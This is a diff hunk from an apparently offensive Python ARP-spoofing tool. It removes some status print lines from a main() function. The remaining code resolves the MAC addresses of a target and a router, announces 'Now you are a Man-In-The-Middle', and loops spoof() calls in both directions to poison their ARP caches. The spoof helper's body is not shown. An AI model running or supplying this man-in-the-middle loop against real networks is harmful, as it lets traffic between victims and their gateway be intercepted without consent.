@@ -68,18 +68,14 @@ def main(t, i, r, h, event, isValid):
     target, interface, router_ip, hwsrc = [t, i, r, h] # get arguments
 
     if isValid:
-        print(colored("\n[+] Getting destination Mac Addresses...", "yellow"))
         target_mac =  get_dst_mac(target, interface)
         router_mac =  get_dst_mac(router_ip, interface)
     
         if not target_mac or not router_mac:
             print(colored("\n[!] Error: Failed to get destination mac address.\n", "red"))
             sys.exit(1)
-        else:
-            print(colored("\n[+] Destination Mac was succesfully obtained.", "green"))
 
         print(colored(f"\n[+] Now you are a Man-In-The-Middle for {target} target.", "blue"))
-        print(colored(f"\n---------------------------------------------------------\n", "blue"))
         while not event.is_set():
             spoof(target, interface, router_ip, hwsrc, target_mac)
             spoof(router_ip, interface, target, hwsrc, router_mac)
